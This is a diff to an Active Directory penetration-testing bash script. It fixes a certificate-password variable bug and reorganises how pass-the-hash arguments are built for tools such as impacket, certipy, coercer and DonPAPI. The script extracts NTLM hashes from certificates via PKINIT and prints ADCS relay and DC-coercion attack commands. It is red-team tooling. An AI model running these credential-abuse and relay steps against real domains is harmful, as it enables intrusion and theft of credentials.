@@ -150,7 +150,7 @@ while test $# -gt 0; do
             -K) krb5cc="${2}"; kerb_bool=true; shift;; #location of krb5cc ticket
             -A) aeskey="${2}"; aeskey_bool=true; shift;; #AES Key (128 or 256 bits)
             -C) pfxcert="${2}"; cert_bool=true; shift;; #location of PFX certificate
-            --cert-pass) pfxcert="${2}"; shift;; #Password of PFX certificate
+            --cert-pass) pfxpass="${2}"; shift;; #Password of PFX certificate
             -t) dc_ip="${2}"; shift;; #mandatory
             --target) dc_ip="${2}"; shift;; #mandatory
             -M) modules="${2}"; shift;; #comma separated modules to run
@@ -400,44 +400,11 @@ authenticate (){
 
     #Check if NTLM hash is used, and complete with empty LM hash / Check if Certificate is provided for PKINIT
     if [ "${hash_bool}" == true ] || [ "${cert_bool}" == true ]; then
-        if ([ "${#hash}" -eq 65 ] && [ "$(expr substr $hash 33 1)" == ":" ]) || ([ "${#hash}" -eq 33 ] && [ "$(expr substr $hash 1 1)" == ":" ]) ; then
-            if [ "$(echo $hash | cut -d ":" -f 1)" == "" ] ; then
-                hash="aad3b435b51404eeaad3b435b51404ee"$hash
-            fi
-            argument_ne="-d ${domain} -u ${user} -H ${hash}"
-            argument_imp=" -hashes ${hash} ${domain}/${user}"
-            argument_imp_gp=" -hashes ${hash} ${domain}/${user}"
-            argument_imp_ti="-user ${user} -hashes ${hash} -domain ${domain}"
-            argument_bhd="-u ${user}@${domain} --hashes ${hash} --auth-method ntlm"
-            argument_enum4linux="-w ${domain} -u ${user} -H $(expr substr $hash 34 65)"
-            argument_adidns="-u ${domain}\\${user} -p ${hash}"
-            argument_ldd="-u ${domain}\\${user} -p ${hash}"
-            argument_smbmap="-d ${domain} -u ${user} -p ${hash}"
-            argument_certi_py="${domain}/${user} --hashes ${hash}"
-            argument_certipy="-u ${user}@${domain} -hashes ${hash}"
-            argument_pre2k="-d ${domain} -u ${user} -hashes ${hash}"
-            argument_certsync="-d ${domain} -u ${user} -hashes ${hash}"
-            argument_donpapi=" -H ${hash} ${domain}/${user}"
-            argument_hekatomb="-hashes ${hash} ${domain}/${user}"
-            argument_silenthd="-u ${domain}\\${user} --hashes ${hash}"
-            argument_windap="-d ${domain} -u ${user} --hash ${hash}"
-            argument_targkerb="-d ${domain} -u ${user} -H ${hash}"
-            argument_p0dalirius="-d ${domain} -u ${user} -H $(expr substr $hash 34 65)"
-            argument_manspider="-d ${domain} -u ${user} -H $(expr substr $hash 34 65)"
-            argument_coercer="-d ${domain} -u ${user} --hashes ${hash}"
-            argument_aced=" -hashes ${hash} ${domain}/${user}"
-            argument_sccm="-d ${domain} -u ${user} -hashes ${hash}"
-            argument_ldapper="-D ${domain} -U ${user} -P ${hash}"
-            
-        else
-            echo -e "${RED}[i]${NC} Incorrect format of NTLM hash..."
-            exit 1
-        fi
         if [ "${cert_bool}" == true ]; then
             echo -e "${YELLOW}[!]${NC} WARNING only ldeep and bloodyAD currently support certificate authentication.${NC}"
             echo -e "${YELLOW}[!]${NC} Extracting the NTLM hash of the user using PKINIT and using PtH for all other tools${NC}"
             pkinit_auth
-            $(which openssl) pkcs12 -in "${output_dir}/Credentials/${user}.pfx" -out "${output_dir}/Credentials/${user}.pem" -nodes -passin pass:""
+            $(which openssl) pkcs12 -in "${pfxcert}" -out "${output_dir}/Credentials/${user}.pem" -nodes -passin pass:""
             if [ -f "${output_dir}/Credentials/${user}.pem" ]; then
                 pem_cert="${output_dir}/Credentials/${user}.pem"
                 echo -e "${GREEN}[+] PFX Certificate converted to PEM successfully:${NC} ${output_dir}/Credentials/${user}.pem"
@@ -445,12 +412,43 @@ authenticate (){
             argument_bloodyad="-d ${domain} -u ${user} -c :${pem_cert}"
             argument_ldeep="-d ${domain} -u ${user} --pfx-file ${pfxcert}"
             auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}Certificate of $user located at $(realpath $pfxcert)${NC}"
-            hash_bool=false
+            hash_bool=true
         else
-            argument_ldeep="-d ${domain} -u ${user} -H ${hash}"
-            argument_bloodyad="-d ${domain} -u ${user} -p ${hash}"
-            cert_bool=false
-            auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}NTLM hash of ${user}${NC}"
+            if ([ "${#hash}" -eq 65 ] && [ "$(expr substr $hash 33 1)" == ":" ]) || ([ "${#hash}" -eq 33 ] && [ "$(expr substr $hash 1 1)" == ":" ]) ; then
+                if [ "$(echo $hash | cut -d ":" -f 1)" == "" ] ; then
+                    hash="aad3b435b51404eeaad3b435b51404ee"$hash
+                fi
+                argument_ne="-d ${domain} -u ${user} -H ${hash}"
+                argument_imp=" -hashes ${hash} ${domain}/${user}"
+                argument_imp_gp=" -hashes ${hash} ${domain}/${user}"
+                argument_imp_ti="-user ${user} -hashes ${hash} -domain ${domain}"
+                argument_bhd="-u ${user}@${domain} --hashes ${hash} --auth-method ntlm"
+                argument_enum4linux="-w ${domain} -u ${user} -H $(expr substr $hash 34 65)"
+                argument_adidns="-u ${domain}\\${user} -p ${hash}"
+                argument_ldd="-u ${domain}\\${user} -p ${hash}"
+                argument_smbmap="-d ${domain} -u ${user} -p ${hash}"
+                argument_certi_py="${domain}/${user} --hashes ${hash}"
+                argument_certipy="-u ${user}@${domain} -hashes ${hash}"
+                argument_pre2k="-d ${domain} -u ${user} -hashes ${hash}"
+                argument_certsync="-d ${domain} -u ${user} -hashes ${hash}"
+                argument_donpapi=" -H ${hash} ${domain}/${user}"
+                argument_hekatomb="-hashes ${hash} ${domain}/${user}"
+                argument_silenthd="-u ${domain}\\${user} --hashes ${hash}"
+                argument_windap="-d ${domain} -u ${user} --hash ${hash}"
+                argument_targkerb="-d ${domain} -u ${user} -H ${hash}"
+                argument_p0dalirius="-d ${domain} -u ${user} -H $(expr substr $hash 34 65)"
+                argument_manspider="-d ${domain} -u ${user} -H $(expr substr $hash 34 65)"
+                argument_coercer="-d ${domain} -u ${user} --hashes ${hash}"
+                argument_aced=" -hashes ${hash} ${domain}/${user}"
+                argument_sccm="-d ${domain} -u ${user} -hashes ${hash}"
+                argument_ldapper="-D ${domain} -U ${user} -P ${hash}"
+                argument_ldeep="-d ${domain} -u ${user} -H ${hash}"
+                argument_bloodyad="-d ${domain} -u ${user} -p ${hash}"
+                auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}NTLM hash of ${user}${NC}"
+            else
+                echo -e "${RED}[i]${NC} Incorrect format of NTLM hash..."
+                exit 1
+            fi
         fi
         pass_bool=false
         kerb_bool=false
@@ -1076,7 +1074,7 @@ adcs_vuln_parse (){
             echo -e "${YELLOW}# ${vulntemp} certificate authority${NC}"
             echo -e "${CYAN}1. Start the relay server:${NC}"
             echo -e "${certipy} relay -ca ${vulntemp} -dc-ip ${dc_ip}"
-            echo -e "${CYAN}2. Coerce Domain Controler:${NC}"
+            echo -e "${CYAN}2. Coerce Domain Controller:${NC}"
             echo -e "${coercer} coerce ${argument_coercer} -t ${i} -l $attacker_IP --dc-ip $dc_ip"
         done
     fi
@@ -1126,7 +1124,7 @@ adcs_vuln_parse (){
             echo -e "${YELLOW}# ${vulntemp} certificate authority${NC}"
             echo -e "${CYAN}1. Start the relay server (relay to the Certificate Authority and request certificate via ICPR):${NC}"
             echo -e "ntlmrelayx.py -t rpc://PKI_Server -rpc-mode ICPR -icpr-ca-name $vulntemp -smb2support"
-            echo -e "${CYAN}2. Coerce Domain Controler:${NC}"
+            echo -e "${CYAN}2. Coerce Domain Controller:${NC}"
             echo -e "${coercer} coerce ${argument_coercer} -t ${i} -l $attacker_IP --dc-ip $dc_ip"
         done
     fi
@@ -2487,11 +2485,11 @@ set_attackerIP(){
 pkinit_auth() {
     current_dir=$(pwd)
     cd ${output_dir}/Credentials
-    if [[ ${pfxcert} == "" ]]; then
+    if [[ ${pfxpass} == "" ]]; then
         run_command "${certipy} auth -pfx ${pfxcert} -dc-ip ${dc_ip} -username ${user} -domain ${domain}" | tee "${output_dir}/Credentials/certipy_PKINIT_output_${dc_domain}.txt"
     else
         echo -e "${CYAN}[i]${NC} Certificate password is provided, generating new unprotected certificate using Certipy${NC}"
-        run_command "${certipy} cert -export -pfx $(realpath $pfxcert) -password $pfxcert -out ${user}_unprotected.pfx" | tee "${output_dir}/Credentials/certipy_PKINIT_output_${dc_domain}.txt"
+        run_command "${certipy} cert -export -pfx $(realpath $pfxcert) -password $pfxpass -out ${user}_unprotected.pfx" | tee "${output_dir}/Credentials/certipy_PKINIT_output_${dc_domain}.txt"
         run_command "${certipy} auth -pfx ${user}_unprotected.pfx -dc-ip ${dc_ip} -username ${user} -domain ${domain}" | tee -a "${output_dir}/Credentials/certipy_PKINIT_output_${dc_domain}.txt"
     fi
     hash=$(/bin/cat "${output_dir}/Credentials/certipy_PKINIT_output_${dc_domain}.txt" 2>/dev/null | grep "Got hash for" | cut -d " " -f 6)
@@ -3254,20 +3252,19 @@ auth_menu () {
                     echo -e "${RED}Invalid pfx file.${NC} Please specify location of certificate file:"
                     read -p ">> " pfxcert </dev/tty
                 done
-                if [[ ${pfxcert} == "" ]]; then
+                if [[ ${pfxpass} == "" ]]; then
                     echo -e "Please specify password of certificate file (press Enter if no password):"
-                    read -p ">> " pfxcert </dev/tty
+                    read -p ">> " pfxpass </dev/tty
                 fi
             fi
             echo -e "${CYAN}[*] Extracting NTLM hash from certificate using PKINIT${NC}"
-            pkinit_auth
             pass_bool=false
             hash_bool=false
             aeskey_bool=false
             kerb_bool=false
             unset KRB5CCNAME
             cert_bool=true
-           authenticate
+            authenticate
         fi
         echo -e ""
         auth_menu
@@ -3290,7 +3287,7 @@ auth_menu () {
                 cd ${current_dir}
                 if [ -f "${output_dir}/Credentials/${user}.pfx" ]; then
                     pfxcert="${output_dir}/Credentials/${user}.pfx"
-                    pfxcert=""
+                    pfxpass=""
                     echo -e "${GREEN}[+] PFX Certificate requested successfully:${NC} ${output_dir}/Credentials/${user}.pfx"
                     $(which openssl) pkcs12 -in "${output_dir}/Credentials/${user}.pfx" -out "${output_dir}/Credentials/${user}.pem" -nodes -passin pass:""
                     if [ -f "${output_dir}/Credentials/${user}.pem" ]; then
